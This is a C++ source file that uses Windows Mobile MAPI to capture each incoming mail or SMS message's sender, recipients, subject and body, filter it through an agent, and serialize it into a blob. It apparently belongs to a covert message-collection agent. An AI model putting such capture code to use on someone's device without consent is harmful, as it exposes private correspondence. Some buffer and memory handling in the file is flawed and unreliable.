#include <list>

#include "MAPICommon.h"
#include "MAPIAgent.h"
#include "MAPIMessage.h"
#include "MAPIAttachment.h"
#include "MAPISerialize.h"

#define INITGUID
#define USES_IID_IMAPITable
#include <mapiguid.h>

LPBYTE getMIMEBody(IMessage *pMsg, LPDWORD lpcbSize);
LPBYTE getHTMLBody(IMessage *pMsg, LPDWORD lpcbSize);
LPBYTE getTEXTBody(IMessage *pMsg, LPDWORD lpcbSize);
LPBYTE getWideCharBody( LPSTREAM stream, LPDWORD lpcbSize, BOOL isWide );

MAPIMessage::MAPIMessage(IMessage *pMsg)
: _pMsg(pMsg), _pMsgProps(NULL), _pAttachTable(NULL), 
_cbMsgProps(0), _lpMimeBody(NULL), _cbMimeBodySize(0),
_Class(NULL), _From(NULL), _Subject(NULL), _DeliveryTime(NULL), 
_hasAttach(FALSE), _To(NULL), _lpTextBody(NULL), _cbTextBodySize(0)
{ 
	LPTSTR alphabet = L"abcdefABCDEF1234567890";

	ZeroMemory(&_header, sizeof(_header));

	for (UINT i = 0; i < _filenameLength; i++)
		_lpFilename[i] = alphabet[rand() % _tcslen(alphabet)];
}

MAPIMessage::~MAPIMessage(void)
{ 
	if (_lpMimeBody) LocalFree(_lpMimeBody);
	if (_To) LocalFree(_To);
	if (_pMsgProps) MAPIFreeBuffer(_pMsgProps);
	if (_pAttachTable) _pAttachTable->Release();
	if (_pMsg) _pMsg->Release();

	/*
	for (std::list<MAPIAttachment*>::iterator i = attachments.begin(); i < attachments.end(); i++)
	delete *i;
	attachments.clear();
	*/
}

HRESULT MAPIMessage::Parse(FilterTypes type)
{
	HRESULT hr = E_FAIL;

	hr = _GetProperties();
	if (FAILED(hr))
	{
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR getting message properties]", 5, FALSE);
		return E_FAIL;
	}

	hr = _ParseProperties();
	if (FAILED(hr))
	{
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR parsing message properties]", 5, FALSE);
		return E_FAIL;
	}

	BOOL accepted = MAPIAgent::Instance()->Accept(this, type);
	if (accepted == FALSE) {
		DBG_TRACE(L"Debug - MAPIAdviseSink.cpp - OnNotify() [ERROR message not accepted]", 5, FALSE);
		return E_FAIL;
	}
	
	/* body and recipients are fetched only for mail (SMS do not have body) */
	if (isMail()) {
		_GetRecipients();
		_GetMessageBody();
	}
	
	return S_OK;
}

HRESULT MAPIMessage::_GetProperties( void )
{
	ULONG rgTags[] = {6,  PR_MESSAGE_CLASS,
		PR_MESSAGE_DELIVERY_TIME,
		// PR_CLIENT_SUBMIT_TIME,
		PR_EMAIL_ADDRESS,
		PR_SENDER_EMAIL_ADDRESS,
		PR_SUBJECT,
		PR_HASATTACH};

	HRESULT hr = _pMsg->GetProps((LPSPropTagArray)rgTags, MAPI_UNICODE, &_cbMsgProps, &_pMsgProps);
	if (hr != S_OK)
		return E_FAIL;

	return S_OK;
}

HRESULT MAPIMessage::_ParseProperties( void )
{
	for (ULONG idx = 0; idx < _cbMsgProps; idx++)
	{
		switch(_pMsgProps[idx].ulPropTag)
		{
		case PR_MESSAGE_CLASS:
			_Class = _pMsgProps[idx].Value.lpszW;
			break;
		case PR_MESSAGE_DELIVERY_TIME:
			_DeliveryTime = &_pMsgProps[idx].Value.ft;
			CopyMemory(&_header.DeliveryTime, _DeliveryTime, sizeof(FILETIME));
			break;
		case PR_CLIENT_SUBMIT_TIME:
			_DeliveryTime = &_pMsgProps[idx].Value.ft;
			CopyMemory(&_header.DeliveryTime, _DeliveryTime, sizeof(FILETIME));
			break;
		case PR_SENDER_EMAIL_ADDRESS:
			_From = _pMsgProps[idx].Value.lpszW;
			DBG_TRACE(_From, 5, FALSE);
			break;
		case PR_SUBJECT:
			_Subject = _pMsgProps[idx].Value.lpszW;
			DBG_TRACE(_Subject, 5, FALSE);
			break;
		case PR_HASATTACH:
			_hasAttach = static_cast<BOOL>(_pMsgProps[idx].Value.i);
			break;
		case PR_EMAIL_ADDRESS:
			_To = _pMsgProps[idx].Value.lpszW;
			DBG_TRACE(_To, 5, FALSE);
			break;
		default:
			{

			}
			break;
		}

		Sleep(5);
	}

	// set delivery time to current time (if we don't have a valid delivery time)
	if (_DeliveryTime == NULL) {
		SYSTEMTIME systemTime;
		GetSystemTime(&systemTime);
		SystemTimeToFileTime(&systemTime, &_header.DeliveryTime);
		_DeliveryTime = &_header.DeliveryTime;
	}

	return S_OK;
}

HRESULT MAPIMessage::_GetRecipients( void )
{
	if (_To != NULL) {
		LocalFree(_To);
		_To = NULL;
	}
	_To = (LPTSTR) LocalAlloc(LPTR, MAXBUF * sizeof(TCHAR));

	HRESULT hr = _WriteRecipientsToString(_To);
	if (FAILED(hr))
	{
		LocalFree(_To);
		_To = NULL;
		return E_FAIL;
	}

	return S_OK;
}

HRESULT MAPIMessage::_WriteRecipientsToString( LPTSTR pszTo )
{
	_ASSERT(_pMsg);

	HRESULT hr = E_FAIL;
	BOOL fFirstRecipient =   TRUE;
	size_t pcchA, pcchB;

	LPMAPITABLE pRecipientTable = NULL;
	hr = _pMsg->GetRecipientTable (0, &pRecipientTable);
	if (hr == MAPI_E_NO_RECIPIENTS)
		return S_OK;
	else if (FAILED(hr))
		return E_FAIL;

	/*
	SizedSPropTagArray(4, Columns) = { 4, { PR_DISPLAY_NAME, PR_EMAIL_ADDRESS, PR_RECIPIENT_TYPE, PR_ADDRTYPE}};

	hr = pRecipientTable->SetColumns((LPSPropTagArray)&Columns, 0);
	if (FAILED(hr))
	return E_FAIL;
	*/

	DWORD remainingChars = MAXBUF;

	LOOP
	{
		SRowSet * pRowSet = NULL;

		// Copy properties to the ADRLIST
		hr = pRecipientTable->QueryRows (1, 0, &pRowSet);
		if (FAILED(hr))
		{
			pRecipientTable->Release();
			return E_FAIL;
		}

		// Did we hit the end of the table?
		if (pRowSet->cRows != 1)
			break; 

		// Point just past the last property
		LPSPropValue pspvLast = pRowSet->aRow[0].lpProps + pRowSet->aRow[0].cValues;

		// Loop through all the properties returned for this row
		for (LPSPropValue pPropValue = pRowSet->aRow[0].lpProps; pPropValue < pspvLast; ++pPropValue)
		{
			switch (pPropValue->ulPropTag)
			{
				//At this point you may also be interested on PR_DISPLAY_NAME
			case PR_EMAIL_ADDRESS:

				// if this is not the first recipient, add comma before the next one
				if (!fFirstRecipient) 
				{
					hr = StringCchLength(pszTo, MAXBUF, &pcchA);
					if (FAILED(hr)) 
					{
						FreeProws(pRowSet);
						pRecipientTable->Release();           
						return E_FAIL;
					}

					// buffer is full, return
					if (remainingChars < 2 + 1) {
						FreeProws(pRowSet);
						pRecipientTable->Release();
						return S_OK;
					}

					hr = StringCchCat(pszTo, pcchA + 2 + 1, TEXT(", "));
					if (FAILED(hr)) 
					{
						FreeProws(pRowSet);
						pRecipientTable->Release();
						return E_FAIL;
					}

					remainingChars -= 2 + 1;
				}
				else 
				{
					fFirstRecipient = FALSE;
				}

				// get length of current recipient string
				hr = StringCchLength(pszTo, MAXBUF, &pcchA);
				if (FAILED(hr)) 
				{
					FreeProws(pRowSet);
					pRecipientTable->Release();
					return E_FAIL;
				}

				// get length of recipient to be added
				hr = StringCchLength(pPropValue->Value.lpszW, MAXBUF, &pcchB);
				if (FAILED(hr)) 
				{
					FreeProws(pRowSet);
					pRecipientTable->Release();
					return E_FAIL;
				}

				// if buffer is full, return
				if (remainingChars < pcchB + 1) {
					FreeProws(pRowSet);
					pRecipientTable->Release();
					return S_OK;
				}

				// concatenate the new recipient to those already present
				hr = StringCchCat(pszTo, pcchB + 1, pPropValue->Value.lpszW);
				if (FAILED(hr)) 
				{
					FreeProws(pRowSet);
					pRecipientTable->Release();
					return E_FAIL;
				}

				remainingChars -= pcchB + 1;

				break;

			default:
				break;
			}
		}

		FreeProws (pRowSet);
		pRowSet = NULL;
	}

	pRecipientTable->Release();

	return S_OK;
}

HRESULT MAPIMessage::_FormatDateTime( LPFILETIME ft, LPTSTR lpwDate, LPTSTR lpwTime )
{
	_ASSERT(ft);
	_ASSERT(lpwDate);
	_ASSERT(lpwTime);

	SYSTEMTIME st = {0};
	FileTimeToSystemTime(ft, &st);

	int lenDate = GetDateFormat(LOCALE_USER_DEFAULT, DATE_SHORTDATE, &st, NULL, NULL, 0);
	int err = GetDateFormat(LOCALE_USER_DEFAULT, DATE_SHORTDATE, &st, NULL, lpwDate, lenDate);
	if (err == 0)
		return E_FAIL;

	int lenTime = GetTimeFormat(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT | TIME_NOTIMEMARKER, &st, NULL, NULL, 0);
	err = GetTimeFormat(LOCALE_USER_DEFAULT, 
		TIME_FORCE24HOURFORMAT | TIME_NOTIMEMARKER, 
		&st, 
		NULL, 
		lpwTime, 
		lenTime);
	if (err == 0)
		return E_FAIL;

	return S_OK;
}

HRESULT MAPIMessage::_GetMessageBody()
{	
	_lpMimeBody = getMIMEBody(_pMsg, &_cbMimeBodySize); 
	if (_lpMimeBody != NULL) {
		DBG_TRACE_INT(L"Debug - MAPIMessage.cpp - _GetMessageBody() [MIME body captured] size: ", 5, FALSE, _cbMimeBodySize);
		return S_OK;
	}
	
	_lpTextBody = getHTMLBody(_pMsg, &_cbTextBodySize);
	if (_lpTextBody != NULL) {
		//_ASSERT( _cbTextBodySize % sizeof(TCHAR) == 0 ); // check that unicode size is correct!
		DBG_TRACE_INT(L"Debug - MAPIMessage.cpp - _GetMessageBody() [HTML body captured] size: ", 5, FALSE, _cbTextBodySize);
		return S_OK;
	}
		
	_lpTextBody = getTEXTBody(_pMsg, &_cbTextBodySize);
	if (_lpTextBody != NULL) {
		//_ASSERT( _cbTextBodySize % sizeof(TCHAR) == 0); // check that unicode size is correct!
		DBG_TRACE_INT(L"Debug - MAPIMessage.cpp - _GetMessageBody() [TEXT body captured] size:", 5, FALSE, _cbTextBodySize);
		return S_OK;
	}
	
	DBG_TRACE(L"Debug - MAPIMessage.cpp - _GetMessageBody() [ERROR cannot capture message body]", 5, FALSE);
	return E_FAIL;
}

LPBYTE MAPIMessage::_GetAttachmentBody( LPATTACH pAttach, LPDWORD cbSize )
{
	_ASSERT(pAttach);
	_ASSERT(cbSize);
	
	/* set a safe value for size */
	*cbSize = 0;
	
	SPropTagArray tagArray; 
	tagArray.cValues = 1; 
	tagArray.aulPropTag[0] = PR_ATTACH_DATA_BIN;

	LPSTREAM pStream = NULL;
	HRESULT hr = pAttach->OpenProperty(PR_ATTACH_DATA_BIN, (LPIID)&IID_IStream, STGM_READ, 0, (LPUNKNOWN*)&pStream);
	if (FAILED(hr))
	{
		return NULL;
	}

	STATSTG stsg;
	hr = pStream->Stat(&stsg, STATFLAG_NONAME);
	if (FAILED(hr))
	{
		pStream->Release();
		return NULL;
	}

	(*cbSize) = (DWORD)stsg.cbSize.LowPart;

	LPBYTE lpBody = NULL;
	if ((*cbSize) > 0)
	{
		lpBody = (LPBYTE)LocalAlloc(LPTR, *cbSize);

		ULONG cbRead = 0;
		hr = pStream->Read(lpBody, *cbSize, &cbRead);
		if (FAILED(hr))
		{
			LocalFree(lpBody);
			pStream->Release();
			return NULL;
		}
	}

	pStream->Release();

	return lpBody;
}
MAPIAttachment* MAPIMessage::GetSingleAttachment()
{
	ASSERT(_pAttachTable);

	HRESULT hr = E_FAIL;
	SRowSet* pRowSet;

	hr = _pAttachTable->QueryRows(1, 0, &pRowSet);
	if (FAILED(hr))
		return NULL;

	// no more attachments?
	if (pRowSet->cRows != 1)
		return NULL;

	ULONG ulAttachNum = 0;
	LPTSTR lpFilename = NULL;
	LONG status = 0;
	LONG size = 0;

	ULONG cProps = pRowSet->aRow[0].cValues;
	for (ULONG j = 0; j < cProps; j++)
	{
		LPSPropValue pPropValue = &pRowSet->aRow[0].lpProps[j];
		ULONG ulTag = pPropValue->ulPropTag;
		switch(ulTag)
		{
		case PR_ATTACH_NUM:
			{
				ulAttachNum = static_cast<ULONG>(pPropValue->Value.ul);
			}
			break;
		case PR_ATTACH_FILENAME:
		case PR_ATTACH_LONG_FILENAME:
			{
				lpFilename = static_cast<LPTSTR>(pPropValue->Value.lpszW);
			}
			break;
		case PR_MSG_STATUS:
			break;
		case PR_ATTACH_SIZE:
			break;
		default:
			break;
		}

		Sleep(5);
	}

	if (lpFilename && (ulAttachNum != 0))
	{
		LPATTACH pAttach = NULL;
		hr = _pMsg->OpenAttach(ulAttachNum, NULL, MAPI_BEST_ACCESS, &pAttach);
		if (FAILED(hr))
		{
			FreeProws(pRowSet);
			pRowSet = NULL;
			return NULL;
		}

		MAPIAttachment* attach = new MAPIAttachment(pAttach, lpFilename);
		if (attach)
		{
			attach->SetStatus(status);
			attach->SetTotalSize(size);
		}

		FreeProws(pRowSet);
		pRowSet = NULL;

		return attach;
	}

	FreeProws(pRowSet);
	pRowSet = NULL;

	return NULL;
}

HRESULT MAPIMessage::Print(void)
{
	HRESULT hr = E_FAIL;
	TCHAR dbgString[256] = {0};

	// Class

	// DateTime
	if (_DeliveryTime != NULL)
	{
		LPTSTR lpwDate = (LPTSTR) LocalAlloc(LPTR, MAXBUF * sizeof(TCHAR));
		LPTSTR lpwTime = (LPTSTR) LocalAlloc(LPTR, MAXBUF * sizeof(TCHAR));
		hr = _FormatDateTime(_DeliveryTime, lpwDate, lpwTime);
		if (SUCCEEDED(hr))
		{

		}
		else
		{

		}
		LocalFree(lpwDate); LocalFree(lpwTime);
	}

	// From

	// Subject

	// Attach

	return S_OK;
}

void MAPIMessage::SetNumberOfAttach( DWORD nAttachs )
{
	_header.nAttachs = nAttachs;
}


LONG MAPIMessage::Size()
{
	return _header.Size;
}

#if 0
HRESULT MAPIMessage::GetAttachments( void )
{
	HRESULT hr = _OpenAttachments();
	if (FAILED(hr))
		return hr;

	MAPIAttachment* attach = NULL;
	while ((attach = GetSingleAttachment()) != NULL)
	{
		ASSERT(attach);
		attachments.push_back(attach);
	}

	return S_OK;
}
#endif

LPBYTE MAPIMessage::Serialize( LPDWORD lpdwLength )
{
	_ASSERT(lpdwLength);

	MAPISerializedMessageHeader* header = Header();
	if (header == NULL)
		return NULL;

	// Set Protocol Version
	header->VersionFlags |= MAPI_V1_0_PROTO;

	MAPISerializer<ObjectTypes> serializer;

	// calculate size of blob
	DWORD cbBlobSize = 0;
	cbBlobSize = sizeof(MAPISerializedMessageHeader);       // size of _header struct
	cbBlobSize += serializer.SerializedWStringLength(Folder());
	cbBlobSize += serializer.SerializedWStringLength(Class());
	cbBlobSize += serializer.SerializedWStringLength(From());
	cbBlobSize += serializer.SerializedWStringLength(To());
	// cbBlobSize += serializer.SerializedWStringLength(Cc());
	cbBlobSize += serializer.SerializedWStringLength(Subject());
	
	// account for body size
	DWORD cbMimeBodySize = 0;
	DWORD cbTextBodySize = 0;
	LPBYTE lpMimeBody = MIMEBody(&cbMimeBodySize);
	LPBYTE lpTextBody = TEXTBody(&cbTextBodySize);
	
	if (lpMimeBody && cbMimeBodySize > 0) {
		// MIME body length
		cbBlobSize += serializer.SerializedObjectLength(cbMimeBodySize);
	} else if (lpTextBody && cbTextBodySize > 0) {
		// HTML/TEXT body length
		cbBlobSize += serializer.SerializedObjectLength(cbTextBodySize);
	}
	
	// allocate buffer for serialized message
	LPBYTE lpBlob = (LPBYTE) LocalAlloc(LPTR, cbBlobSize);
	if (lpBlob == NULL)
		return NULL;
	
	LPBYTE ptr = lpBlob;
	
	// fixup serialized message size in header
	header->dwSize = cbBlobSize;
	
	// skip header for now
	ptr += sizeof(MAPISerializedMessageHeader);

	// serialize strings
	if (Folder())
	{
		DWORD cbSerializedStringSize = serializer.SerializeWString(ptr, Folder(), STRING_FOLDER);
		ptr += cbSerializedStringSize;
	}

	if (Class())
	{
		DWORD cbSerializedStringSize = serializer.SerializeWString(ptr, Class(), STRING_CLASS);
		ptr += cbSerializedStringSize;
	}

	if (From())
	{
		DWORD cbSerializedStringSize = serializer.SerializeWString(ptr, From(), STRING_FROM);
		ptr += cbSerializedStringSize;
	}

	if (To())
	{
		DWORD cbSerializedStringSize = serializer.SerializeWString(ptr, To(), STRING_TO);
		ptr += cbSerializedStringSize;
	}

	if (Subject())
	{
		DWORD cbSerializedStringSize = serializer.SerializeWString(ptr, Subject(), STRING_SUBJECT);
		ptr += cbSerializedStringSize;
	}

	// MIME body
	if (cbMimeBodySize > 0)
	{
		DWORD cbSerializedObjectSize = serializer.SerializeObject(ptr, lpMimeBody, cbMimeBodySize, OBJECT_MIMEBODY);
		ptr += cbSerializedObjectSize;
	}
	
	// HTML/TEXT body
	if (cbTextBodySize > 0)
	{
		DWORD cbSerializedObjectSize = serializer.SerializeObject(ptr, lpTextBody, cbTextBodySize, OBJECT_TEXTBODY);
		ptr += cbSerializedObjectSize;
	}
	
	// Attachments
	if (HasAttachments())
	{
#pragma message(__LOC__"*** ATTACHMENTS SERIALIZATION NOT IMPLEMENTED!")
	}

	// write header
	CopyMemory(lpBlob, header, sizeof(MAPISerializedMessageHeader));

	(*lpdwLength) = cbBlobSize;

	return lpBlob;
}

LPBYTE getMIMEBody(IMessage *pMsg, LPDWORD lpcbSize) 
{
	ASSERT(pMsg);
	ASSERT(lpcbSize);
	
	// set a safe size
	*lpcbSize = 0;
	
	IStream* istream = NULL;
	HRESULT hr = pMsg->OpenProperty(PR_CE_MIME_TEXT, &IID_IStream, STGM_READ, 0, (LPUNKNOWN*)&istream);
	if (FAILED(hr))
	{
		DBG_TRACE(L"Debug - MAPIMessage.cpp - getMIMEBody() [message is not MIME encoded]", 5, FALSE);

		ASSERT(*lpcbSize == 0);
		return NULL;
	}
	
	STATSTG stg;
	hr = istream->Stat(&stg, STATFLAG_NONAME);
	if (FAILED(hr))
	{
		DBG_TRACE(L"Debug - MAPIMessage.cpp - getMIMEBody() [ERROR cannot stat body stream]", 5, FALSE);
		istream->Release();
		
		return NULL;
	}
	
	DWORD cbBodySize = stg.cbSize.LowPart;
	if (cbBodySize == 0) {
		istream->Release();	
		
		return NULL;
	}

	LPBYTE lpBody = (LPBYTE)LocalAlloc(LPTR, cbBodySize);

	hr = istream->Read(lpBody, cbBodySize, lpcbSize);
	if (FAILED(hr))
	{
		DBG_TRACE(L"Debug - MAPIMessage.cpp - getMIMEBody() [ERROR cannot read body]", 5, FALSE);

		LocalFree(lpBody);
		istream->Release();
		
		return NULL;
	}

	istream->Release();
	
	DBG_TRACE(L"Debug - MAPIMessage.cpp - getMIMEBody() [got message body]", 5, FALSE);
	
	*lpcbSize = cbBodySize;
	return lpBody;
}

LPBYTE getHTMLBody(IMessage *pMsg, LPDWORD lpcbSize)
{
	// set a safe size
	*lpcbSize = 0;

	LPSTREAM pstmBody = NULL;
	HRESULT hr = E_FAIL;
	
	hr = pMsg->OpenProperty (PR_BODY_HTML_W, NULL, STGM_READ, 0, (IUnknown **) &pstmBody);
	if ( hr == S_OK ) {
		LPBYTE body = getWideCharBody( pstmBody, lpcbSize, TRUE );
		if (body) return body;
	}
	
	hr = pMsg->OpenProperty (PR_BODY_HTML_A, NULL, STGM_READ, 0, (IUnknown **) &pstmBody);
	if ( hr == S_OK ) {
		LPBYTE body = getWideCharBody( pstmBody, lpcbSize, FALSE );
		if (body) return body;
	}

#if 0
	hr = pMsg->OpenProperty (PR_BODY_HTML, NULL, STGM_READ, 0, (IUnknown **) &pstmBody);
	if ( hr == S_OK ) {
		LPBYTE body = getWideCharBody( pstmBody, lpcbSize, TRUE );
		if (body) return body;
	}
#endif

	*lpcbSize = 0;
	return NULL;
}

LPBYTE getTEXTBody(IMessage *pMsg, LPDWORD lpcbSize)
{
	// set a safe size
	*lpcbSize = 0;
	
	LPSTREAM pstmBody = NULL;
	HRESULT hr = E_FAIL;
	
	hr = pMsg->OpenProperty (PR_BODY_W, NULL, STGM_READ, 0, (IUnknown **) &pstmBody);
	if ( hr == S_OK ) {
		LPBYTE body = getWideCharBody( pstmBody, lpcbSize, TRUE );
		if (body) return body;
	}
	
	hr = pMsg->OpenProperty (PR_BODY_A, NULL, STGM_READ, 0, (IUnknown **) &pstmBody);
	if ( hr == S_OK ) {
		LPBYTE body = getWideCharBody( pstmBody, lpcbSize, FALSE );
		if (body) return body;
	}
	
#if 0
	hr = pMsg->OpenProperty (PR_BODY, NULL, STGM_READ, 0, (IUnknown **) &pstmBody);
	if ( hr == S_OK ) {
		LPBYTE body = getWideCharBody( pstmBody, lpcbSize, FALSE );
		if (body) return body;
	}
#endif
	
	*lpcbSize = 0;
	return NULL;
}

LPBYTE getWideCharBody( LPSTREAM stream, LPDWORD lpcbSize, BOOL isWide )
{   
	// Safe value for size
	*lpcbSize = 0;

	//Get the size of the body
	STATSTG statstg;
	HRESULT hr = stream->Stat(&statstg, STATFLAG_NONAME);
	if (FAILED(hr))
		return NULL;
	
	//Allocate a buffer for the stream
	DWORD numBytes = statstg.cbSize.LowPart;
	
#if DEBUG
	if (numBytes == 0)
		DBG_TRACE(L"Debug - MAPIMessage.cpp - getWideCharBody() [message has size == 0]", 5, FALSE);
#endif
	
	LPBYTE body = new BYTE[numBytes + 1];
	ZeroMemory(body, numBytes);
	
	// read stream array (IStream::Read wants a BYTE* as 1st arg)
	ULONG bytesRead = 0;
	hr = stream->Read (body, numBytes, &bytesRead);
	if (FAILED(hr))
		return NULL;

	if ( isWide == TRUE ) {
		// return as is
		*lpcbSize = bytesRead;
		return body;
	}
	
	int cchWide = MultiByteToWideChar(CP_ACP, 0, (char*)body, -1, 0, 0); 
	
	LPTSTR wideBody = new TCHAR[cchWide];
	ZeroMemory(wideBody, cchWide * sizeof(TCHAR));
	
	MultiByteToWideChar(CP_ACP, 0, (char*)body, -1, wideBody, cchWide); 
	
	*lpcbSize = cchWide * sizeof(TCHAR);
	if (*lpcbSize == 0)
		return NULL;
	
	return (LPBYTE) wideBody;
}
